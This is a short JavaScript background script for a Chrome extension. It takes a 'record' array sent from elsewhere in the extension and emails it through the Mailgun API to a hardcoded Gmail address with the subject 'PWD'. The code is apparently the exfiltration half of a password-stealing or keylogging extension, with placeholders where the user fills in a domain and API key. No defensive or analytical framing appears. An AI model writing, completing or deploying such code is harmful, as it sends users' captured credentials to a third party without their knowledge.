
chrome.extension.onRequest.addListener(function(request, tab, respond) {

    if (request.action === 'send') {

                var arr = request.record;
                var data = arr.join(' ');

 		        var body =   {
			        from: 'mailgun@sandboxab04a0cb2f204bb3a60fc5c0500ea941.mailgun.org', //<--- from
                    		to : 'autukr@gmail.com', //<--- to
			        subject: 'PWD',
			        text: data
		        };

                var xhr = new XMLHttpRequest();
                xhr.open("POST", "https://api.mailgun.net/v3/<YOUR DOMAIN THERE>/messages", true); //<--- Your mailgun domain there
                xhr.setRequestHeader ("Authorization", "<YOUR API-KEY THERE>"); //<--- Your key there
                xhr.setRequestHeader("Content-Type","application/json");
                xhr.send(JSON.stringify(body));
    }
});
